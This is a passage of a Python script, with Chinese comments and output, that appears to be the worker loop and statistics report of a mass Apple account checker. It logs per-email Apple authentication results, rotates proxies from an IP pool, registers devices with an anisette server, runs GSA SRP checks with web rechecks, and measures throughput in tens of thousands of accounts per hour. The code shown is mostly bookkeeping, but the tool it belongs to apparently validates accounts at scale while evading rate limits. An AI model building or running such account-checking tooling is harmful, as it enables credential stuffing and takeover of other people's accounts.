                row = {'tid': tid, 'slot': slot, 'email': email,
                       'raw_status': raw_status,
                       'proxy': proxy.split('//')[-1].split(':')[0],
                       'status': status, 'final': final_status,
                       'overridden': overridden,
                       'ec': result.get('apple_ec'),
                       'detail': str(result.get('apple_message')
                                     or result.get('detail') or '')[:160],
                       'http': result.get('http'), 'ms': round(elapsed, 1),
                       'thread_cpu_ms': round(thread_cpu, 2),
                       'attempts': attempts, 'retry_reason': retry_reason,
                       'budget_hit': budget_hit,
                       'ip_ms': round(ip_ms, 1), 'otp_ms': round(otp_ms, 1),
                       'chk_ms': round(chk_ms, 1), 'gap_ms': round(gap_ms, 2),
                       'web_status': web_status, 'web_ec': web_ec,
                       'web_detail': web_detail, 'web_method': web_method,
                       'web_ms': round(web_ms, 1)}
                line = json.dumps(row, ensure_ascii=False)
                batch = None
                with lock:
                    results['done'] += 1
                    results['cpu'] += thread_cpu / 1000.0
                    results['by_status'][final_status] = results['by_status'].get(final_status, 0) + 1
                    results.setdefault('by_raw', {})
                    results['by_raw'][raw_status] = results['by_raw'].get(raw_status, 0) + 1
                    seg = results.setdefault('seg', {'ip': [], 'otp': [], 'chk': [],
                                                     'gap': [], 'loop': [],
                                                     'chk_cpu': [], 'bucket_cpu': [],
                                                     'otp_cpu': [], 'tail_cpu': []})
                    seg['chk_cpu'].append(chk_cpu)
                    seg['bucket_cpu'].append(bucket_cpu)
                    seg['otp_cpu'].append(otp_cpu)
                    seg['tail_cpu'].append(max(0.0, thread_cpu - chk_cpu
                                               - bucket_cpu - otp_cpu))
                    seg['gap'].append(gap_ms)
                    seg['loop'].append((time.perf_counter() - t0) * 1000)
                    seg['ip'].append(ip_ms)
                    seg['otp'].append(otp_ms)
                    if otp_ms < 5:
                        results['otp_hit'] = results.get('otp_hit', 0) + 1
                    else:
                        results['otp_fetch'] = results.get('otp_fetch', 0) + 1
                    seg['chk'].append(chk_ms)
                    if budget_hit:
                        results['budget_hit'] = results.get('budget_hit', 0) + 1
                    if attempts > 1:
                        results['retried'] = results.get('retried', 0) + 1
                        rk = results.setdefault('by_retry', {})
                        rk[retry_reason or '?'] = rk.get(retry_reason or '?', 0) + 1
                    if web_method:
                        results.setdefault('by_method', {})
                        results['by_method'][web_method] = results['by_method'].get(web_method, 0) + 1
                    if web_status:
                        results.setdefault('by_web', {})
                        results['by_web'][web_status] = results['by_web'].get(web_status, 0) + 1
                        http_tag = str(web.get('http') or '')
                        key = f'{status} → {web_status}' + (f' (HTTP {http_tag})' if http_tag else '')
                        results.setdefault('cross', {})
                        results['cross'][key] = results['cross'].get(key, 0) + 1
                    if results['done'] % 10 == 0:
                        results['samples'].append(row)
                    if len(results['recent']) >= 12:
                        results['recent'].popleft()
                    results['recent'].append(row)
                    write_buffer.append(line)
                    if len(write_buffer) >= 200:        # 200 条才落一次盘
                        batch = '\n'.join(write_buffer) + '\n'
                        write_buffer.clear()
                if batch is not None:                   # 落盘在锁外
                    sink.write(batch)
                    sink.flush()
                served += 1
                mine += 1
                t_prev_end = time.perf_counter()
            if ip_pool is not None:
                ip_pool.release(tid, proxy, proxy_exp, healthy=ok_count > 0)
            if served == 0:
                if not my_tasks:
                    break
                stop.wait(0.5 + random.uniform(0.0, 0.5))
        with lock:
            spent = (time.thread_time() - cpu_start) * 1000
            results['per_thread_cpu'].append(round(spent, 1))
            results['per_thread_count'].append(mine)

    results['started'] = started
    live_thread = threading.Thread(target=live_writer, name='live', daemon=True)
    live_thread.start()
    def worker_guarded(tid):
        try:
            worker(tid)
        except BaseException as exc:                               # noqa: BLE001
            import traceback
            with lock:
                results.setdefault('worker_errors', []).append(
                    f'{type(exc).__name__}: {exc}')
            traceback.print_exc()
        finally:
            slot = args.slot_base + tid + 1
            with lock:
                results['device_registering'].discard(slot)
                results['device_in_use'].discard(slot)

    threads = [threading.Thread(target=worker_guarded, args=(i,), name=f'w{i}', daemon=True)
               for i in range(args.threads)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    wall = time.perf_counter() - started
    with lock:
        if write_buffer:
            sink.write('\n'.join(write_buffer) + '\n')
            write_buffer.clear()
    sink.close()
    stop.set()
    live_thread.join(timeout=3)      # 必须等写线程退出，否则它会覆盖最终状态
    done_now = results['done']
    expected_now = len(rows)
    results['incomplete'] = max(0, expected_now - done_now)
    try:
        with open(args.live, encoding='utf-8') as handle:
            final = json.load(handle)
        # 状态必须由"实际完成数 vs 预期数"决定，不能无条件标完成
        final['finished'] = results['incomplete'] == 0
        final['status'] = 'complete' if results['incomplete'] == 0 else 'incomplete'
        final['expected'] = expected_now
        final['done'] = done_now
        final['incomplete'] = results['incomplete']
        final['elapsed'] = round(wall, 1)
        device_registered = count_registered_devices(
            args.device_root, 'https://new.ani.sidestore.io')
        final['device_ready'] = device_registered
        final['device_registered'] = device_registered
        final['device_in_use'] = len(results['device_in_use'])
        final['device_registering'] = len(results['device_registering'])
        final['register_errors'] = results['register_errors']
        final['register_error_types'] = dict(results['register_error_types'])
        with open(args.live, 'w', encoding='utf-8') as handle:
            json.dump(final, handle, ensure_ascii=False)
    except OSError:
        pass

    done = results['done']
    cpu = results['cpu']
    print('\n=== 结果 ===')
    print(f'完成 {done} 条 / 墙钟 {wall:.1f}s = {done / wall:.1f} 条/秒 '
          f'= {done / wall * 3600 / 10000:.1f} 万/小时')
    proc_cpu = time.process_time() - proc_cpu_start
    main_cpu = time.thread_time() - main_cpu0
    print(f'CPU 记账（同一个进程内，互不重叠）:')
    print(f'  业务线程合计  {cpu:.2f}s = {cpu / wall:.2f} 核'
          f'  单条 {cpu / done * 1000 if done else 0:.1f} ms')
    print(f'  整进程        {proc_cpu:.2f}s = {proc_cpu / wall:.2f} 核')
    print(f'  主线程        {main_cpu:.2f}s = {main_cpu / wall:.2f} 核'
          f'  （含 live 写盘、JSON 序列化）')
    sup = getattr(ip_pool, 'cpu_supplier', 0.0) if ip_pool is not None else 0.0
    snap = (ip_pool.stats.get('cpu_snapshot', 0.0)
            if ip_pool is not None else 0.0)
    rest = proc_cpu - cpu - main_cpu - sup
    print(f'  补池线程      {sup:.2f}s = {sup / wall:.2f} 核')
    print(f'  其中快照      {snap:.2f}s')
    print(f'  未归因        {rest:.2f}s = {rest / wall:.2f} 核'
          f'  （初始化、设备注册、线程创建）')
    print(f'每线程 CPU 中位 {statistics.median(results["per_thread_cpu"]):.0f} ms，'
          f'每线程条数 中位 {statistics.median(results["per_thread_count"]):.0f}')
    print(f'IP 获取失败线程 {results["ip_fail"]}')
    try:
        from fastcheck.protocols.gsa_status import stage_cpu_summary
        stages = stage_cpu_summary()
    except Exception:
        stages = {}
    if stages:
        print('gs.check 内部阶段（毫秒）:')
        for k in ('srp_ctor', 'client_setup', 'init_dumps', 'http_init_total',
                  'srp_challenge', 'done_dumps', 'http_complete_total'):
            if k in stages:
                n, med, mx = stages[k]
                print(f'  {k:<22} p50={med:8.2f}  max={mx:8.2f}  n={n}')
        print()
    boot = results.get('boot_segments') or {}
    if boot:
        print('线程启动分段（CPU 毫秒，中位数）:')
        for k in ('pool_ctor', 'info', 'profile', 'client_ctor',
                  'register_cpu', 'register_wall'):
            vals = sorted(boot.get(k) or [])
            if vals:
                label = 'register_wall' if k == 'register_wall' else k
                print(f'    {label:<16} p50={statistics.median(vals):7.2f}  '
                      f'max={vals[-1]:8.2f}  n={len(vals)}')
    hit, fetch = results.get('otp_hit', 0), results.get('otp_fetch', 0)
    if hit or fetch:
        print(f'公共头: 复用命中 {hit} 条 · 真实拉取 {fetch} 次 · '
              f'复用率 {hit/(hit+fetch)*100:.1f}%')
    if results.get('budget_hit'):
        print(f'预算耗尽: {results["budget_hit"]} 条（超过 {args.item_timeout:.0f}s 直接判超时）')
    if results.get('retried'):
        print(f'重试: {results["retried"]} 条触发 · 原因分布 {results.get("by_retry")}')
    if ip_pool is not None:
        snap = ip_pool.snapshot()
        ip_pool.stop()
        print(f'IP 池: API {snap["api_calls"]} 次 / 拉取 {snap["fetched"]} 条 / '
              f'预热 {snap["warmed"]} 条 / 去重 {snap["duplicate"]}')
        print(f'       取用: 本地命中 {snap["local_hit"]} 次 · 共享命中 {snap["shared_hit"]} 次 · '
              f'阻塞 {snap["blocked"]} 次')
        print(f'       淘汰: 丢弃 {snap["discarded"]} 过期 {snap["expired"]} · '
              f'在册 {snap["tracked"]} 条')
    print(f'状态（原始 result_bucket 口径）: {results["by_status"]}')
    print(f'状态（classify 裸口径）      : {results.get("by_raw")}')
    if results.get('by_web'):
        print(f'web 复核结果                 : {results["by_web"]}')
        if results.get('by_method'):
            print('au=repair 的 web 细化结果:')
            for key, value in sorted(results['by_method'].items(),
                                     key=lambda kv: -kv[1]):
                print(f'    {key:<34} {value}')
        print('交叉表（GSA → web）:')
        for key, value in sorted((results.get('cross') or {}).items(),
                                 key=lambda kv: -kv[1]):
            print(f'    {key:<34} {value}')
    seg = results.get('seg') or {}
    print('业务循环 CPU 拆分（毫秒，中位数）:')
    for name, label in (('otp_cpu', '取公共头'), ('chk_cpu', '打 Apple(CPU)'),
                        ('bucket_cpu', '分类'), ('tail_cpu', '记录/其他')):
        vals = sorted(seg.get(name) or [])
        if vals:
            print(f'  {label:<14} p50={statistics.median(vals):7.2f}  '
                  f'p90={vals[int(len(vals)*0.9)]:7.2f}  max={vals[-1]:8.2f}')
    print()
    for name, label in (('ip', '取 IP(墙钟)'), ('gap', '轮间空档'), ('otp', '取公共头(墙钟)'),
                        ('chk', '打 Apple(墙钟)')):
        vals = sorted(seg.get(name) or [])
        if vals:
            n = len(vals)
            print(f'{label} 耗时 p50={statistics.median(vals):6.0f}ms '
                  f'p90={vals[int(n*.9)]:6.0f}ms max={vals[-1]:6.0f}ms '
                  f'合计 {sum(vals)/1000:.1f}s')
    ms = sorted(r['ms'] for r in results['samples'])
    if ms:
        n = len(ms)
        print(f'单条墙钟 p50={statistics.median(ms):.0f}ms p90={ms[int(n*.9)]:.0f}ms '
              f'max={max(ms):.0f}ms（采样 {n} 条）')
    tc = sorted(r['thread_cpu_ms'] for r in results['samples'])
    if tc:
        print(f'单条线程 CPU p50={statistics.median(tc):.1f}ms max={max(tc):.1f}ms')
    expected = len(rows)
    if done != expected:
        missing = expected - done
        print(f'⚠ 未完成：预期 {expected} 条，实际 {done} 条，缺 {missing} 条'
              f'（线程提前退出/设备注册失败/任务异常）')
        results['incomplete'] = missing
    print(f'明细 {args.out}')


if __name__ == '__main__':
    main()
